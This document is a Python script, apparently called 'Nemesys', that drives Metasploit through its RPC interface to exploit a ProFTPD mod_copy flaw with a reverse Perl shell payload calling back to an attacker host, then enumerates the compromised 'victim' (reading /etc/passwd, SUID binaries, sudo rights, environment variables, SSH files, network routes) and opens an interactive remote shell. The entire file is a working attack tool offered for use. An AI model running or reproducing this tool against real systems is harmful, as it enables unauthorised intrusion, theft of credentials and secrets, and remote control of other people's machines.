import datetime
import logging
from pymetasploit3.msfrpc import MsfRpcClient
import time
from datetime import datetime

# Logger configuration
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger("Nemesys")

class Nemesys:
    def __init__(self, password, ssl=True):
        """Initializes and connects to the Metasploit client."""
        try:
            self.client = MsfRpcClient(password, ssl=ssl)
            logger.info("üíÄ Connected to Metasploit! Ready for action...")
        except Exception as e:
            logger.error(f"‚ùå Failed to connect to Metasploit: {e}")
            self.client = None

    def exploit(self, exploit_name, payload_name, exploit_options={}, payload_options={}):
        """
        Executes a specific exploit with the chosen payload and handles post-exploitation tasks.
        
        Args:
            exploit_name (str): Name of the exploit module.
            payload_name (str): Name of the payload module.
            exploit_options (dict): Options for the exploit (e.g., RHOSTS, RPORT).
            payload_options (dict): Options for the payload (e.g., LHOST, LPORT).
        """
        if not self.client:
            logger.warning("‚ö†Ô∏è Client is not connected.")
            return None

        # Run the initial exploit
        exploit_uuid = self._run_exploit(exploit_name, payload_name, exploit_options, payload_options)
        if exploit_uuid:
            session_id = self._get_session_id(exploit_uuid)
            if session_id:
                self._enumerate_system(session_id)
                self._open_shell(session_id)
            else:
                logger.error("‚ùå No session was established.")
        else:
            logger.error("‚ùå Exploit execution failed.")

    def _run_exploit(self, exploit_name, payload_name, exploit_options, payload_options):
        """Private method to run the specified exploit and return its UUID."""
        exploit = self.client.modules.use("exploit", exploit_name)
        for option, value in exploit_options.items():
            exploit[option] = value

        payload = self.client.modules.use("payload", payload_name)
        for option, value in payload_options.items():
            payload[option] = value

        logger.info(f"‚ò†Ô∏è Running exploit '{exploit_name}' with payload '{payload_name}'...")
        try:
            output = exploit.execute(payload=payload)
            logger.info("üî• Exploit executed successfully.")
            logger.debug(f"Execution output: {output}")
            return output.get('uuid')
        except Exception as e:
            logger.error(f"‚ùå Failed to execute exploit: {e}")
            return None

    def _get_session_id(self, uuid, timeout=15):
        """Retrieves the session ID generated by an exploit, if available."""
        if not self.client:
            logger.warning("‚ö†Ô∏è Client is not connected.")
            return None

        end_time = time.time() + timeout
        logger.info(f"‚è≥ Waiting for session to become active...")

        while time.time() < end_time:
            sessions = self.client.sessions.list
            for session in sessions:
                if sessions[session].get('exploit_uuid') == uuid:
                    logger.info(f"üíÄ Session established! Session ID: {session}")
                    return session
            time.sleep(1)

        logger.warning("‚ö†Ô∏è No session found.")
        return None

    def _open_shell(self, session_id):
        """Private method that allows interaction with an open shell session."""
        shell = self.client.sessions.session(session_id)
        banner = """
        ========================================================
        üíÄ Welcome to the Nemesys Shell Interface üíÄ
        (Type 'exit' to leave)
        ========================================================
        """
        logger.info(banner)
        try:
            while True:
                shell.write("whoami\n")
                time.sleep(1)
                user = shell.read().strip()
                shell.write("pwd\n")
                time.sleep(1)
                directory = shell.read().strip()
                # Build the prompt with user and directory information
                prompt = f"{user}@victim:{directory}$ "
                command = input(prompt)
                if command.lower() == 'exit':
                    break
                # Send the command to the shell
                shell.write(command + '\n')
                time.sleep(1)
                output = shell.read()
                # Log the output of the command execution
                logger.info(output)
        except KeyboardInterrupt:
            logger.info("üëã Exiting interactive session.")

    def _enumerate_system(self, session_id):
        """Performs system enumeration to gather critical information."""
        logger.info("üíÄ Starting system enumeration...")

        # Generate a filename with timestamp to avoid conflicts
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        log_filename = f"system_enumeration_{timestamp}.log"

        # Open the log file to store command outputs
        with open(log_filename, "a") as log_file:
            # Run specific enumeration tasks
            self._enumerate_os_and_kernel(session_id, log_file)
            self._enumerate_kernel_vulnerabilities(session_id, log_file)
            self._enumerate_permissions_and_configs(session_id, log_file)
            self._inspect_running_services(session_id, log_file)
            self._check_network_configs(session_id, log_file)
            self._inspect_config_files(session_id, log_file)
            self._evaluate_insecure_binaries(session_id, log_file)

            logger.info(f"üíÄ System enumeration complete ‚úÖ (Results saved in {log_filename})")

    def _enumerate_os_and_kernel(self, session_id, log_file):
        """Enumerates the OS and kernel version."""
        logger.info("üñ•Ô∏è Enumerating OS and kernel version...")
        self._run_command(session_id, "uname -a", log_file)
        self._run_command(session_id, "cat /etc/issue", log_file)
        self._run_command(session_id, "cat /etc/*release", log_file)
        logger.info("üñ•Ô∏è OS and kernel version enumeration complete ‚úÖ")

    def _enumerate_kernel_vulnerabilities(self, session_id, log_file):
        """Identifies kernel vulnerabilities."""
        logger.info("üîç Identifying kernel vulnerabilities...")
        self._run_command(session_id, "cat /proc/version", log_file)
        logger.info("üîç Kernel vulnerability identification complete ‚úÖ")

    def _enumerate_permissions_and_configs(self, session_id, log_file):
        """Enumerates sensitive permissions and configurations."""
        logger.info("üîë Enumerating sensitive permissions and configurations...")
        self._run_command(session_id, "id", log_file)
        self._run_command(session_id, "cat /etc/passwd", log_file)
        self._run_command(session_id, "cat /etc/group", log_file)
        self._run_command(session_id, "find / -perm -4000 -type f 2>/dev/null", log_file)
        self._run_command(session_id, "sudo -l", log_file)
        logger.info("üîë Sensitive permissions and configurations enumeration complete ‚úÖ")

    def _inspect_running_services(self, session_id, log_file):
        """Inspects running processes and services."""
        logger.info("‚öôÔ∏è Inspecting running processes and services...")
        self._run_command(session_id, "ps aux", log_file)
        self._run_command(session_id, "netstat -tulnp", log_file)
        self._run_command(session_id, "ss -tulnp", log_file)
        logger.info("‚öôÔ∏è Running processes and services inspection complete ‚úÖ")

    def _check_network_configs(self, session_id, log_file):
        """Checks network configurations and possible pivots."""
        logger.info("üåê Checking network configurations and possible pivots...")
        self._run_command(session_id, "ip route", log_file)
        self._run_command(session_id, "ifconfig", log_file)
        self._run_command(session_id, "ip addr", log_file)
        logger.info("üåê Network configurations and pivot checks complete ‚úÖ")

    def _inspect_config_files(self, session_id, log_file):
        """Inspects configuration files and passwords."""
        logger.info("üîê Inspecting configuration files and passwords...")
        self._run_command(session_id, "env", log_file)
        self._run_command(session_id, "find / -name '*.ssh'", log_file)
        logger.info("üîê Configuration files and passwords inspection complete ‚úÖ")

    def _evaluate_insecure_binaries(self, session_id, log_file):
        """Evaluates insecure binaries or vulnerable libraries."""
        logger.info("‚ö†Ô∏è Evaluating insecure binaries or vulnerable libraries...")
        self._run_command(session_id, "python --version", log_file)
        self._run_command(session_id, "perl --version", log_file)
        self._run_command(session_id, "gcc --version", log_file)
        logger.info("‚ö†Ô∏è Insecure binaries and vulnerable libraries evaluation complete ‚úÖ")

    def _run_command(self, session_id, command, log_file):
        """Runs a command on the victim's machine via the session."""
        shell = self.client.sessions.session(session_id)
        shell.write(command + '\n')
        time.sleep(1)
        output = shell.read()

        # Write the command output to the log file
        log_file.write(f"Executed command: {command}\n")
        log_file.write(f"Output: {output}\n\n")

def main():
    """Main function that orchestrates the flow using the Nemesys class."""
    client = Nemesys("password")

    # Exploit and payload configuration
    exploit_name = "unix/ftp/proftpd_modcopy_exec"
    payload_name = "cmd/unix/reverse_perl"
    exploit_options = {
        'RHOSTS': '192.168.11.128',
        'SITEPATH': '/var/www/html'
    }
    payload_options = {
        'LHOST': '192.168.11.129',
        'LPORT': 4445
    }

    # Execute the exploit and perform system enumeration
    client.exploit(exploit_name, payload_name, exploit_options, payload_options)

if __name__ == "__main__":
    main()